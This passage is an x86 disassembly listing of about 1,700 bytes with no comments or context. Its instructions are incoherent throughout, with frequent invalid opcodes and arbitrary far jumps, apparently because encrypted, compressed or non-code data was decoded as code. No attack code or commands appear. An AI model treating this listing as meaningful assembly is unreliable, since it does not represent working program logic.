  4120b8:	stos   DWORD PTR es:[edi],eax
  4120b9:	mov    ecx,0xd8897481
  4120be:	je     0x412109
  4120c0:	xor    ebx,DWORD PTR [ebx+0xe7549db]
  4120c6:	aam    0x19
  4120c8:	ins    BYTE PTR es:[edi],dx
  4120c9:	jmp    0x8fcf:0x72f18de5
  4120d0:	cld    
  4120d1:	xor    eax,0x19965dbb
  4120d6:	(bad)  
  4120d7:	xlat   BYTE PTR ds:[ebx]
  4120d8:	push   esi
  4120d9:	shr    BYTE PTR [eax+0x45],0x93
  4120dd:	pusha  
  4120de:	nop
  4120df:	gs cmc 
  4120e1:	call   DWORD PTR [ebx-0x6b672c99]
  4120e7:	scas   al,BYTE PTR es:[edi]
  4120e8:	inc    ebp
  4120e9:	loopne 0x412098
  4120eb:	stos   DWORD PTR es:[edi],eax
  4120ec:	jno    0x4120bf
  4120ee:	out    dx,al
  4120ef:	jle    0x4120c6
  4120f1:	ins    BYTE PTR es:[edi],dx
  4120f2:	jg     0x41214f
  4120f4:	test   eax,0xe4dce512
  4120f9:	leave  
  4120fa:	sub    BYTE PTR [eax+0x7c558c4f],ch
  412100:	mov    DWORD PTR [eax+0x73ba5010],esp
  412106:	cs pop ss
  412108:	mov    eax,ds:0xcdf8f92d
  41210d:	sbb    al,0x1c
  41210f:	retf   0x353f
  412112:	mov    dh,0x4b
  412114:	sub    BYTE PTR [eax],cl
  412116:	loopne 0x412185
  412118:	ret    
  412119:	and    al,0x1b
  41211b:	add    al,0xd0
  41211d:	enter  0xa333,0xbf
  412121:	lods   al,BYTE PTR ds:[esi]
  412122:	add    al,0x58
  412124:	or     DWORD PTR [ebx-0x66b92dab],ebx
  41212a:	pop    esp
  41212b:	mov    dl,0x28
  41212d:	dec    ebp
  41212e:	ins    DWORD PTR es:[edi],dx
  41212f:	mov    ds:0x81e853db,eax
  412134:	xchg   ebx,eax
  412135:	jnp    0x4120e8
  412137:	xchg   edi,eax
  412138:	xlat   BYTE PTR ds:[ebx]
  412139:	push   cs
  41213a:	mov    cl,0x60
  41213c:	ror    BYTE PTR [ebx-0x5d],1
  41213f:	xlat   BYTE PTR ds:[ebx]
  412140:	fld    DWORD PTR [edx+0x2e674d37]
  412146:	sti    
  412147:	(bad)  
  412148:	dec    ecx
  412149:	pop    edx
  41214a:	or     eax,0x36cac9cd
  41214f:	dec    esp
  412150:	push   edi
  412151:	inc    esi
  412152:	ret    
  412153:	dec    ecx
  412154:	dec    ebx
  412155:	mov    dl,0xad
  412157:	xlat   BYTE PTR ds:[ebx]
  412158:	inc    ebx
  412159:	or     eax,0xb6e789ac
  41215e:	fdiv   DWORD PTR ds:0xc43894f6
  412164:	scas   eax,DWORD PTR es:[edi]
  412165:	cld    
  412166:	mov    dl,0x77
  412168:	ss cli 
  41216a:	imul   edi,DWORD PTR [ecx],0xe3f676f0
  412170:	mov    esp,0x6278fddf
  412175:	xchg   ebp,eax
  412176:	fmul   st(6),st
  412178:	xor    eax,0xbc66c22c
  41217d:	aas    
  41217e:	inc    edx
  41217f:	xchg   esp,eax
  412180:	push   edx
  412181:	lods   al,BYTE PTR ds:[esi]
  412182:	stos   WORD PTR es:[edi],ax
  412184:	adc    dl,al
  412186:	test   BYTE PTR [ebp-0x1eebb48c],bl
  41218c:	dec    edi
  41218d:	jns    0x41211c
  41218f:	push   ebx
  412190:	ins    DWORD PTR es:[edi],dx
  412191:	xor    BYTE PTR [edi],al
  412193:	mov    esi,0x91a88aa9
  412198:	mov    eax,0xea166de1
  41219d:	cdq    
  41219e:	hlt    
  41219f:	imul   ecx,DWORD PTR [eax+edi*8],0x4d478b41
  4121a6:	sbb    eax,0x42e5ffae
  4121ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121ac:	aad    0x73
  4121ae:	daa    
  4121af:	fild   QWORD PTR [edx]
  4121b1:	in     al,0xf7
  4121b3:	call   edx
  4121b5:	mov    bh,0x85
  4121b7:	mov    eax,0xb2025571
  4121bc:	daa    
  4121bd:	pop    esi
  4121be:	fcmovnu st,st(0)
  4121c0:	scas   al,BYTE PTR es:[edi]
  4121c1:	pslld  mm6,QWORD PTR [eax+0x680b3ed5]
  4121c8:	inc    edx
  4121c9:	mov    cl,0xe1
  4121cb:	rcr    DWORD PTR [ebx+ebx*4+0x72],cl
  4121cf:	add    al,0xe6
  4121d1:	sub    bl,BYTE PTR [esi+ecx*1]
  4121d4:	ins    DWORD PTR es:[edi],dx
  4121d5:	pop    ds
  4121d6:	rcl    DWORD PTR [esi+edi*2-0x4e1d944d],cl
  4121dd:	jb     0x41218e
  4121df:	add    edi,ebx
  4121e1:	jmp    0x241e:0x1484c556
  4121e8:	rcl    al,0xeb
  4121eb:	push   edi
  4121ec:	mov    eax,0xc26fd3df
  4121f1:	std    
  4121f2:	fimul  WORD PTR [ebp-0x70]
  4121f5:	inc    esi
  4121f6:	pop    ecx
  4121f7:	lea    ecx,[eax]
  4121f9:	cmp    eax,ecx
  4121fb:	or     esi,DWORD PTR [ebp+0x249cf02b]
  412201:	stc    
  412202:	arpl   WORD PTR [ebx-0x77],bp
  412205:	aad    0xff
  412207:	outs   dx,DWORD PTR ds:[esi]
  412208:	into   
  412209:	rol    BYTE PTR [ebx],1
  41220b:	lahf   
  41220c:	js     0x412239
  41220e:	push   ds
  41220f:	cli    
  412210:	dec    esp
  412211:	xor    BYTE PTR [ebx],al
  412213:	add    ah,BYTE PTR [ebp+0x40]
  412216:	sbb    BYTE PTR [ecx-0x3cff82f3],al
  41221c:	mov    ah,0x9e
  41221e:	xchg   ebp,eax
  41221f:	cmp    ah,BYTE PTR [edi-0x1e]
  412222:	sar    DWORD PTR [ebx+edi*8+0x44],0x88
  412227:	add    al,BYTE PTR [esi-0x3]
  41222a:	push   0x19449a15
  41222f:	jns    0x41226d
  412231:	or     al,cl
  412233:	jno    0x41221f
  412235:	sahf   
  412236:	data16 fiadd DWORD PTR [ebp-0x34]
  41223a:	cmp    esi,eax
  41223c:	icebp  
  41223d:	nop
  41223e:	mov    edi,0x751a62a
  412243:	mov    bl,0x4f
  412245:	ror    BYTE PTR [ecx+0x7ba05bdd],cl
  41224b:	rcl    BYTE PTR [esi],cl
  41224d:	scas   eax,DWORD PTR es:[edi]
  41224e:	stos   BYTE PTR es:[edi],al
  41224f:	enter  0xff16,0x22
  412253:	jmp    0xa589:0xd16eecea
  41225a:	(bad)  
  41225b:	out    0x4c,al
  41225d:	ins    BYTE PTR es:[edi],dx
  41225e:	addr16 pop esp
  412260:	rcr    BYTE PTR [esi+0x31],0xfd
  412264:	or     bh,bl
  412266:	xchg   BYTE PTR [esi],cl
  412268:	mov    ebp,esi
  41226a:	bound  ebx,QWORD PTR es:[ebx-0x2b34acfd]
  412271:	(bad)  
  412272:	int    0x9e
  412274:	into   
  412275:	scas   al,BYTE PTR es:[edi]
  412276:	ror    BYTE PTR [eax-0x462aec97],0xd8
  41227d:	mov    ch,bl
  41227f:	setne  BYTE PTR [edx+ebp*1+0x4285f8cb]
  412287:	cmc    
  412288:	mov    edi,0xcf9c0cb3
  41228d:	arpl   WORD PTR [edi-0x3c],di
  412290:	or     al,BYTE PTR [ebp+0x152b237a]
  412296:	mov    edi,0x5edd4341
  41229b:	popa   
  41229c:	xchg   edi,eax
  41229d:	inc    edx
  41229e:	in     al,0x8a
  4122a0:	mov    cl,0x2c
  4122a2:	cwde   
  4122a3:	mov    ebx,0x9f20124f
  4122a8:	cmc    
  4122a9:	lods   al,BYTE PTR ds:[esi]
  4122aa:	cmp    ecx,DWORD PTR [edi-0x2a3b6d9b]
  4122b0:	push   ds
  4122b1:	mov    dh,0x58
  4122b3:	push   esp
  4122b4:	add    bh,dl
  4122b6:	pop    esi
  4122b7:	xor    bl,al
  4122b9:	xor    al,0xfb
  4122bb:	or     DWORD PTR [esi+0x6fde766],ebp
  4122c1:	bound  edx,QWORD PTR [esi+0x4ad34cb2]
  4122c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122c8:	repnz lods al,BYTE PTR ds:[esi]
  4122ca:	mov    al,ds:0xe1264f93
  4122cf:	jecxz  0x41229e
  4122d1:	add    BYTE PTR [esi+ebx*1-0x37],ah
  4122d5:	mov    WORD PTR [ecx],gs
  4122d7:	and    esi,0x9ebf4b66
  4122dd:	mov    ch,0x34
  4122df:	sub    BYTE PTR [edi+0x31],dl
  4122e2:	(bad)  
  4122e3:	ffree  st(7)
  4122e5:	sbb    BYTE PTR [ecx],dh
  4122e7:	xlat   BYTE PTR ds:[ebx]
  4122e8:	das    
  4122e9:	xor    eax,eax
  4122eb:	xchg   ebx,eax
  4122ec:	inc    edi
  4122ed:	mov    al,ds:0x34060325
  4122f2:	inc    edi
  4122f3:	jg     0x41235e
  4122f5:	stc    
  4122f6:	loop   0x4122e1
  4122f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122f9:	imul   ecx,DWORD PTR [edi-0x4b5b9ffd],0x1f72a633
  412303:	je     0x4122a8
  412305:	xor    DWORD PTR [esi-0x6074d07],esp
  41230b:	xchg   BYTE PTR [edx+0x1f],dl
  41230e:	es enter 0xa5e6,0x7d
  412313:	jecxz  0x412357
  412315:	inc    edx
  412316:	mov    ch,0xc9
  412318:	out    dx,al
  412319:	lahf   
  41231a:	adc    al,0x65
  41231c:	cmp    BYTE PTR [ebp-0x59de8031],0x25
  412323:	fisttp QWORD PTR [eax]
  412325:	aas    
  412326:	aaa    
  412327:	lock dec edx
  412329:	xor    eax,0xcee80ce3
  41232e:	or     ecx,DWORD PTR [ebx-0x1e]
  412331:	pop    ss
  412332:	or     DWORD PTR [ecx-0x41],ecx
  412335:	ror    DWORD PTR [edi+0x23063a18],cl
  41233b:	les    esi,FWORD PTR [ebx+eax*8-0x6345a8cb]
  412342:	or     dl,BYTE PTR [ecx+0x3a]
  412345:	(bad)
  412349:	and    esp,DWORD PTR [ecx+eiz*4]
  41234c:	pop    ebx
  41234d:	mov    eax,DWORD PTR [eax-0x300c008]
  412353:	and    ah,dh
  412355:	sub    DWORD PTR [edi+0x2e3c63a2],eax
  41235b:	pop    ecx
  41235c:	scas   al,BYTE PTR es:[edi]
  41235d:	lahf   
  41235e:	sbb    ebp,DWORD PTR [eax]
  412360:	push   es
  412361:	mov    dh,0xf3
  412363:	mov    edx,0xe359c93d
  412368:	dec    ecx
  412369:	pop    edx
  41236a:	dec    eax
  41236b:	loopne 0x4122ff
  41236d:	test   ah,al
  41236f:	mov    eax,0x6b09bf41
  412374:	out    0xc2,al
  412376:	into   
  412377:	popa   
  412378:	in     eax,dx
  412379:	in     al,dx
  41237a:	ret    0x659b
  41237d:	add    DWORD PTR ds:0x9a7c0fd0,eax
  412383:	call   0x4f7d:0x533f4295
  41238a:	jg     0x412382
  41238c:	mov    ebx,0x186f62e1
  412391:	adc    eax,0xaf1a7dea
  412396:	push   ds
  412397:	arpl   WORD PTR [edi],sp
  412399:	fnstcw WORD PTR [ebx]
  41239b:	pushf  
  41239c:	sbb    BYTE PTR [edx+0x72],cl
  41239f:	mov    dl,bl
  4123a1:	hlt    
  4123a2:	ret    0xa10b
  4123a5:	mov    fs,ebp
  4123a7:	sti    
  4123a8:	dec    edx
  4123a9:	xchg   esp,eax
  4123aa:	test   eax,0xd7a83d7e
  4123af:	push   es
  4123b0:	sbb    BYTE PTR [ebp-0x4a],bh
  4123b3:	cmc    
  4123b4:	mov    cl,0x61
  4123b6:	xlat   BYTE PTR ds:[ebx]
  4123b7:	mov    dh,0x73
  4123b9:	aaa    
  4123ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123bb:	push   ds
  4123bc:	sbb    DWORD PTR [ebx-0x3d],0x7
  4123c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123c1:	push   0x4f
  4123c3:	jne    0x412380
  4123c5:	inc    esp
  4123c6:	js     0x412357
  4123c8:	dec    esi
  4123c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123ca:	arpl   WORD PTR [eax-0x4a3504c5],bp
  4123d0:	xchg   esi,eax
  4123d1:	gs retf 0x6851
  4123d5:	aaa    
  4123d6:	je     0x4123e8
  4123d8:	cmc    
  4123d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123da:	daa    
  4123db:	sbb    eax,0x4faf25bc
  4123e0:	mul    eax
  4123e2:	mov    dh,bh
  4123e4:	call   0x5769615
  4123e9:	cmp    edx,0xffffffee
  4123ec:	inc    eax
  4123ed:	cdq    
  4123ee:	add    al,BYTE PTR [ecx-0x78]
  4123f1:	fcmovnu st,st(1)
  4123f3:	fisttp QWORD PTR [eax]
  4123f5:	pushf  
  4123f6:	(bad)  
  4123f7:	mov    ds:0x6083b924,eax
  4123fc:	mov    DWORD PTR [edi-0x5852815],ebp
  412402:	cmc    
  412403:	mov    esp,0xa3ef4701
  412408:	mov    edi,?
  41240a:	jecxz  0x41243f
  41240c:	ret    0xfb63
  41240f:	fcomp  DWORD PTR [edi-0x3d185884]
  412415:	test   BYTE PTR [edi-0x65405557],ch
  41241b:	test   BYTE PTR [ebp+edx*2+0x57],al
  41241f:	inc    esi
  412420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412421:	xchg   edx,eax
  412422:	jno    0x4123d2
  412424:	sbb    al,0xd6
  412426:	xchg   BYTE PTR [ebp+0x5ad45022],ch
  41242c:	dec    ebx
  41242d:	mov    edx,0x9c62a073
  412432:	rcr    DWORD PTR [edx],cl
  412434:	ficomp WORD PTR ds:0xa5e79233
  41243a:	inc    esi
  41243b:	int3   
  41243c:	out    dx,eax
  41243d:	test   eax,0x56148bc0
  412442:	in     al,0x68
  412444:	cmc    
  412445:	push   esi
  412446:	mov    bh,0xa0
  412448:	sbb    ch,BYTE PTR [ebp+0x10e7589]
  41244e:	adc    eax,DWORD PTR [ebx+0x60]
  412451:	fwait
  412452:	out    0x4d,eax
  412454:	push   cs
  412455:	xchg   ebx,eax
  412456:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412457:	pop    eax
  412458:	loope  0x41244e
  41245a:	test   BYTE PTR ds:0x884b73a7,bl
  412460:	shr    esi,cl
  412462:	ret    0x798f
  412465:	inc    esp
  412466:	addr16 fwait
  412468:	aaa    
  412469:	imul   ebx,edx,0x71
  41246c:	retf   
  41246d:	pop    ss
  41246e:	mov    cl,0xf2
  412470:	push   eax
  412472:	push   0xe14a3bac
  412477:	lods   eax,DWORD PTR ds:[esi]
  412478:	cmp    eax,0x8476f86c
  41247d:	mov    al,ds:0x97fbd38f
  412482:	xchg   esi,eax
  412483:	mov    DWORD PTR [edx+0x20037462],edi
  412489:	int3   
  41248a:	or     eax,0x85116b04
  41248f:	add    eax,0x47ca4c6d
  412494:	ds pop ecx
  412496:	and    al,BYTE PTR [ebp-0x47b4db0]
  41249c:	push   0xbb426c1b
  4124a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124a2:	mov    DWORD PTR [eax],esp
  4124a4:	lods   al,BYTE PTR ds:[esi]
  4124a5:	add    al,0x51
  4124a7:	xlat   BYTE PTR ds:[ebx]
  4124a8:	pop    edx
  4124a9:	aas    
  4124aa:	push   ss
  4124ab:	mov    ebp,0xbbbea0d1
  4124b0:	repz add al,0x3c
  4124b3:	leave  
  4124b4:	cmp    BYTE PTR [eax],bl
  4124b6:	gs loop 0x41243a
  4124b9:	mov    dl,0xca
  4124bb:	mov    ebp,0xdb3ca20
  4124c0:	dec    eax
  4124c1:	push   0xa9d41ef7
  4124c6:	push   eax
  4124c7:	rol    dh,1
  4124c9:	add    ecx,DWORD PTR [ecx+ebp*4-0x76]
  4124cd:	adc    ebx,DWORD PTR [eax+0x1e]
  4124d0:	push   esp
  4124d1:	in     eax,dx
  4124d2:	iret   
  4124d3:	add    esp,edx
  4124d5:	ja     0x412487
  4124d7:	push   ds
  4124d8:	push   edx
  4124d9:	ss call 0x1454f93
  4124df:	add    dl,al
  4124e1:	mov    ebx,0xd43a8d57
  4124e6:	adc    DWORD PTR [ebp+0x2dea5e7a],ebp
  4124ec:	and    ch,bl
  4124ee:	mov    edx,0xfdaca6f1
  4124f3:	(bad)  
  4124f4:	fwait
  4124f5:	sbb    ecx,DWORD PTR [edi+0x70]
  4124f8:	pop    ebp
  4124f9:	mov    gs,WORD PTR [edx]
  4124fb:	xor    ch,BYTE PTR [esi]
  4124fd:	add    al,dl
  4124ff:	push   cs
  412500:	push   esp
  412501:	nop
  412502:	sti    
  412503:	adc    bh,BYTE PTR [edi-0x17fcc6fa]
  412509:	sub    DWORD PTR ds:0xcadcd1b4,edx
  41250f:	inc    edi
  412510:	adc    DWORD PTR [edi-0x72],eax
  412513:	fbld   TBYTE PTR [ecx]
  412515:	mov    esi,0x710c439b
  41251a:	fstp   DWORD PTR [ebx+0x5de87a9c]
  412520:	ss stc 
  412522:	jo     0x41253e
  412524:	daa    
  412525:	mov    al,ds:0x829eba9
  41252a:	cmp    al,0x11
  41252c:	sbb    di,di
  41252f:	aad    0x82
  412531:	push   edi
  412532:	pop    ebx
  412533:	loope  0x4124ef
  412535:	rol    BYTE PTR [ecx],1
  412537:	cmc    
  412538:	nop
  412539:	pop    ebp
  41253a:	push   0x741cabe9
  41253f:	mov    esp,0xb9a4b2ad
  412544:	and    eax,DWORD PTR [ebx-0x53]
  412547:	adc    ah,BYTE PTR [edx+0x68]
  41254a:	push   ecx
  41254b:	neg    dh
  41254d:	adc    DWORD PTR [ecx+edx*8],eax
  412550:	imul   eax,DWORD PTR [edx+0x57da05d4],0xcb80a8cf
  41255a:	out    0xc0,eax
  41255c:	pop    edi
  41255d:	stc    
  41255e:	sub    DWORD PTR [esi],esp
  412560:	xchg   edx,eax
  412561:	(bad)  
  412562:	push   ebx
  412563:	test   BYTE PTR [eax],0x70
  412566:	gs mov esi,0x89864fb6
  41256c:	nop
  41256d:	xchg   DWORD PTR ds:0x9861595e,edi
  412573:	in     al,dx
  412574:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412575:	sbb    eax,DWORD PTR [ebp+0x1965601c]
  41257b:	ror    BYTE PTR [ecx],1
  41257d:	sbb    DWORD PTR [edx+edx*2+0x8],0x43
  412582:	in     eax,0xa7
  412584:	pop    ebp
  412585:	jb     0x41251c
  412587:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412588:	pop    edx
  412589:	jge    0x412561
  41258b:	xor    dh,ch
  41258d:	dec    esp
  41258e:	pop    es
  41258f:	jl     0x4125bb
  412591:	enter  0x305e,0x5d
  412595:	xor    eax,0x273daa36
  41259a:	xchg   edx,eax
  41259b:	rol    BYTE PTR [ebx+eax*1+0x3ecdfe62],cl
  4125a2:	push   ecx
  4125a3:	inc    ecx
  4125a4:	adc    al,0x7c
  4125a6:	jae    0x4125c2
  4125a8:	mov    cl,0xd9
  4125aa:	repz sub esp,DWORD PTR [ebx+0x3d]
  4125ae:	adc    cl,BYTE PTR ds:[edx+0x22]
  4125b2:	sub    DWORD PTR [eax-0x5f],edi
  4125b5:	aam    0x7f
  4125b7:	or     DWORD PTR [ebx],ebp
  4125b9:	or     bh,BYTE PTR [ebp+0x66]
  4125bc:	bound  eax,QWORD PTR [esi+0x1c]
  4125bf:	add    dh,BYTE PTR [ebp+0x50]
  4125c2:	xor    ah,al
  4125c4:	push   ecx
  4125c5:	aas    
  4125c6:	leave  
  4125c7:	inc    ebx
  4125c8:	inc    esi
  4125c9:	out    dx,al
  4125ca:	jl     0x41258b
  4125cc:	xor    al,0xa1
  4125ce:	popa   
  4125cf:	mov    ss,WORD PTR [esi]
  4125d1:	xor    al,0x71
  4125d3:	lods   eax,DWORD PTR ds:[esi]
  4125d4:	sbb    al,0x83
  4125d6:	and    eax,0xf762e258
  4125db:	into   
  4125dc:	in     eax,0x40
  4125de:	cmp    al,0xa5
  4125e0:	das    
  4125e1:	xor    DWORD PTR [edi-0x52e88363],ebp
  4125e7:	shr    eax,cl
  4125e9:	mov    dl,0x60
  4125eb:	jg     0x412651
  4125ed:	popa   
  4125ee:	or     DWORD PTR [edx],0x42494fd4
  4125f4:	loope  0x4125bb
  4125f6:	ds in  al,dx
  4125f8:	inc    BYTE PTR [eax]
  4125fa:	addr16 push ecx
  4125fc:	lea    esp,[esi-0x32]
  4125ff:	push   0xfffffff5
  412601:	cmp    BYTE PTR [eax],bl
  412603:	leave  
  412604:	neg    ecx
  412606:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412607:	xor    DWORD PTR [ebx+0x49],eax
  41260a:	mov    edi,0xba98680f
  41260f:	sub    DWORD PTR [edi-0x4c5808eb],ebx
  412615:	mov    bl,0xbc
  412617:	test   ebx,0xdf52829c
  41261d:	popf   
  41261e:	adc    al,0x8
  412620:	or     edx,esi
  412622:	div    esi
  412624:	int    0x30
  412626:	add    cl,dl
  412628:	repnz xchg edx,eax
  41262a:	sbb    esp,edx
  41262c:	das    
  41262d:	cmc    
  41262e:	sub    DWORD PTR [edx+0x49],0xda382e95
  412635:	adc    eax,0x362df006
  41263a:	test   BYTE PTR [ebp+0x3fc4a692],bh
  412640:	loope  0x412685
  412642:	mov    DWORD PTR [esi+ebx*2-0x75],ecx
  412646:	pushf  
  412647:	ins    DWORD PTR es:[edi],dx
  412648:	outs   dx,BYTE PTR ds:[esi]
  412649:	add    al,0x16
  41264b:	mov    ecx,0xaf7173fe
  412650:	or     al,0x3f
  412652:	sbb    al,0xba
  412654:	popf   
  412655:	or     BYTE PTR [ecx+eax*2-0x405c9dfc],0x86
  41265d:	and    DWORD PTR [esi+ebp*2-0x19],edi
  412661:	jne    0x4126b0
  412663:	std    
  412664:	xchg   edx,eax
  412665:	mov    ebp,0x3f5bb1dd
  41266a:	loope  0x4126df
  41266c:	imul   edx,DWORD PTR [bp+di+0x320e],0x67
  412672:	mov    esi,0xaa67fbe0
  412677:	jl     0x4126bf
  412679:	xchg   ebp,eax
  41267a:	and    BYTE PTR [ecx],0x90
  41267d:	adc    al,0x6c
  41267f:	arpl   WORD PTR [ebx-0x40],dx
  412682:	shl    DWORD PTR [edi-0x372bd879],cl
  412688:	xchg   DWORD PTR [ecx-0x2f23960f],ebp
  41268e:	jne    0x4126d7
  412690:	fmul   QWORD PTR [ebx-0x61]
  412693:	nop
  412694:	push   ss
  412695:	mov    bh,0xfa
  412697:	add    BYTE PTR [edi+0x43],0xcf
  41269b:	mov    WORD PTR [edx],cs
  41269d:	mov    ebp,0x18e40c14
  4126a2:	mov    esp,0x29cd1be2
  4126a7:	sbb    DWORD PTR [ebx],eax
  4126a9:	add    ebp,DWORD PTR [ebx+0x5bcf12d]
  4126af:	aas    
  4126b0:	sub    ch,BYTE PTR [ecx-0x28]
  4126b3:	xchg   BYTE PTR fs:[edi*1+0x5a990449],dh
  4126bb:	and    DWORD PTR [edx-0x59],eax
  4126be:	loopne 0x41270a
  4126c0:	dec    eax
  4126c1:	retf   0xac04
  4126c4:	mov    al,ds:0x5dbaeba5
  4126c9:	jge    0x41270c
  4126cb:	dec    edx
  4126cc:	xor    edi,DWORD PTR [edx+edx*2]
  4126cf:	mov    esp,0x84571c23
  4126d4:	fdiv   st,st(2)
  4126d6:	mov    al,ds:0x47f7455
  4126db:	stos   DWORD PTR es:[edi],eax
  4126dc:	fldcw  WORD PTR [ebp-0x59]
  4126df:	pop    eax
  4126e0:	mov    ebp,0x1131fde0
  4126e5:	add    BYTE PTR [ecx],dh
  4126e7:	cmp    edx,0x15
  4126ea:	retf   
  4126eb:	fisubr WORD PTR [edi-0x6799b04d]
  4126f1:	je     0x412768
  4126f3:	(bad)  
  4126f4:	stc    
  4126f5:	or     al,bh
  4126f7:	mov    esp,0x8c74f201
  4126fc:	push   esp
  4126fd:	xchg   esp,eax
  4126fe:	test   al,0x28
  412700:	push   ss
  412701:	call   FWORD PTR [edi-0x6e]
  412704:	pop    ss
  412705:	sbb    dl,dl
  412707:	out    0x87,eax
  412709:	aaa    
  41270a:	retf   0x3d58
  41270d:	inc    edx
  41270e:	mov    edx,0xb9600b8f
  412713:	dec    ebx
  412714:	retf   
  412715:	push   ebp
  412716:	imul   esp,DWORD PTR [ebx],0x13d9b79d
  41271c:	dec    ecx
  41271d:	push   ecx
  41271e:	retf   0x82c2
  412721:	add    dl,BYTE PTR [edi]
  412723:	push   eax
  412724:	popa   
  412725:	adc    bh,ch
  412727:	and    eax,0xb8f7a833
  41272c:	fsub   st(1),st
  41272e:	or     BYTE PTR [ebx+0x7c],ah
  412731:	add    eax,0xd16b2058
  412736:	les    esp,FWORD PTR [edx+0x1966e3dc]
  41273c:	dec    edx
  41273d:	cmp    DWORD PTR [edi-0x6768c8d],ebx
  412743:	cvtdq2ps xmm4,XMMWORD PTR [eax-0x69]
  412747:	xor    cl,dl
  412749:	sub    bl,BYTE PTR [ebx-0x18]
  41274c:	in     al,0x9f
  41274e:	stc    
  41274f:	dec    ebp
  412750:	jle    0x41279e
  412752:	out    dx,eax
  412753:	mov    bh,0xfa
  412755:	(bad)
  412758:	inc    eax
  412759:	lahf   
  41275a:	or     BYTE PTR [edx+esi*2],dl
  41275d:	xchg   ebp,eax
  41275e:	or     DWORD PTR [esi+0x2a],0x21
  412762:	popf   
  412763:	inc    edx
  412764:	pop    edi
  412765:	mov    al,ds:0x31001a41
  41276a:	call   0xeafb:0xcb87f1a9
  412771:	jb     0x41273d
  412773:	test   BYTE PTR [eax-0x30b0ef4c],cl
  412779:	arpl   WORD PTR ds:0xc373,bx
  41277e:	inc    esi
  41277f:	mov    ah,0x7d
  412781:	jbe    0x4127ce
  412783:	add    BYTE PTR [edi-0x6b3df05f],0x76
  41278a:	int    0x5b
  41278c:	mov    al,0x3e
  41278e:	adc    DWORD PTR [esi],0xfffffff2
  412791:	fmul   QWORD PTR [edx-0x55de5130]
  412797:	or     bl,cl
  412799:	bound  edi,QWORD PTR [ebx-0x3da671b9]
  41279f:	inc    esi
  4127a0:	aaa    
  4127a1:	popf   
  4127a2:	fisttp WORD PTR [ebx]
  4127a4:	pop    ecx
  4127a5:	aad    0x1b
  4127a7:	(bad)  
  4127a8:	xchg   edi,eax
  4127a9:	shl    DWORD PTR [edx-0x22],cl
  4127ac:	test   eax,0x24282783
  4127b1:	ret    
  4127b2:	loop   0x4127f3
  4127b4:	inc    ecx
  4127b5:	and    ecx,DWORD PTR [edx]
  4127b7:	cdq    
  4127b8:	leave  
  4127b9:	or     eax,0xfd0f4e17
  4127be:	cmp    BYTE PTR [eax-0x19563b9],bl
  4127c4:	(bad)
  4127c7:	and    edx,esp
  4127c9:	cwde   
  4127ca:	fs adc eax,0x838c369d
  4127d0:	pop    ebp
  4127d1:	mov    ch,0x97
  4127d3:	jecxz  0x4127fd
  4127d5:	adc    eax,0xec485777
  4127da:	jns    0x4127a4
  4127dc:	jmp    0xb9906b56
  4127e1:	push   ecx
  4127e2:	mov    al,BYTE PTR [ecx-0x80]
  4127e5:	sbb    eax,0x409189be
  4127ea:	xchg   esi,eax
  4127eb:	out    0x92,eax
  4127ed:	fs imul bl
  4127f0:	adc    edi,eax
  4127f2:	outs   dx,DWORD PTR ds:[esi]
  4127f3:	popa   
  4127f4:	pop    ecx
  4127f5:	xlat   BYTE PTR ds:[ebx]
  4127f6:	pushf  
  4127f7:	add    al,0xa5
  4127f9:	mov    gs,WORD PTR [edi]
  4127fb:	xchg   edx,eax
  4127fc:	test   al,0x70
  4127fe:	push   ecx
  4127ff:	mov    esi,0x47a82f9c
  412804:	adc    BYTE PTR [esi+0x5f],0x5e
  412808:	fwait
  412809:	dec    edi
  41280a:	jo     0x4127ed
  41280c:	pop    ebx
  41280d:	xchg   esi,eax
  41280e:	ja     0x412875
  412810:	jae    0x41283d
  412812:	pop    ds
  412813:	stos   BYTE PTR es:[edi],al
  412814:	xchg   esi,eax
  412815:	sub    eax,0x8be31573
  41281a:	pusha  
  41281b:	and    al,0x29
  41281d:	mov    edx,0x22ea0522
  412822:	fwait
  412823:	pop    edx
  412824:	mov    eax,ds:0xa55ad91a
  412829:	sub    eax,0xbe739814
  41282e:	test   eax,0x120b70eb
  412833:	xchg   ebp,eax
  412834:	push   cs
  412835:	xlat   BYTE PTR ds:[ebx]
  412836:	mov    ch,0xa5
  412838:	mov    eax,0xd39722d
  41283d:	inc    eax
  41283e:	mov    dh,0x9c
  412840:	loopne 0x4127e0
  412842:	ss arpl sp,bx
  412845:	loopne 0x4127d8
  412847:	loope  0x4127e1
  412849:	mov    ecx,0x5326b58e
  41284e:	es dec edx
  412850:	xlat   BYTE PTR ds:[ebx]
  412851:	stos   DWORD PTR es:[edi],eax
  412852:	aam    0xb5
  412854:	es push ebp
  412856:	fadd   DWORD PTR [esi+ecx*2]
  412859:	sbb    BYTE PTR [edi],dh
  41285b:	js     0x41283e
  41285d:	clc    
  41285e:	arpl   WORD PTR [esi+0x33],dx
  412861:	and    dl,BYTE PTR [eax]
  412863:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412864:	loope  0x412807
  412866:	scas   al,BYTE PTR es:[edi]
  412867:	les    edx,FWORD PTR [edi-0x48c0175]
  41286d:	mov    al,ds:0x2320e1c9
  412872:	daa    
  412873:	xlat   BYTE PTR ds:[ebx]
  412874:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412875:	sub    eax,0x85929c3b
  41287a:	xchg   ecx,eax
  41287b:	xor    ah,BYTE PTR [edx+eax*2]
  41287e:	pop    eax
  41287f:	imul   esi,DWORD PTR [ebp+0xb72068f],0xffffff89
  412886:	dec    edx
  412887:	(bad)  
  412888:	push   eax
  412889:	cmp    esi,ebx
  41288b:	inc    esi
  41288c:	pop    edx
  41288d:	xor    ch,BYTE PTR [eax+0x19]
